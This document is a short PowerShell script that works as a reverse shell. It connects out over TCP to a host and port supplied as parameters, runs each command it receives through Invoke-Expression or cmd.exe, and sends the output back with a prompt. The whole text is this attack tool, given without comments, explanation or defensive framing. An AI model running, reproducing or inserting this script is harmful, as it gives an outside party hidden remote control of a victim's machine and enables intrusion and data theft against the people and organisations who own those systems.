param ([string]$hostip='127.0.0.1',[int]$port=5379);
$ps=$true;
$client = New-Object System.Net.Sockets.TCPClient($hostip,$port);
$stream = $client.GetStream();
[byte[]]$bytes = 0..50000|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$cmd=(get-childitem Env:ComSpec).value;$inArray=$data.split();$item=$inArray[0];if(($item -eq '$ps') -and ($ps -eq $false)){$ps=$true}if($item -like '?:'){$item='d:'}$myArray=@('cd','exit','d:','pwd','ls','ps','rm','cp','mv','cat');$do=$false;foreach ($i in $myArray){if($item -eq $i){$do=$true}}if($do -or $ps){$sendback=( iex $data 2>&1 |Out-String)}else{$data2='/c '+$data;$sendback = ( &$cmd $data2 2>&1 | Out-String)};if($ps){$prompt='PS ' + (pwd).Path}else{$prompt=(pwd).Path}$sendback2 = $data + $sendback + $prompt + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
$client.Close()
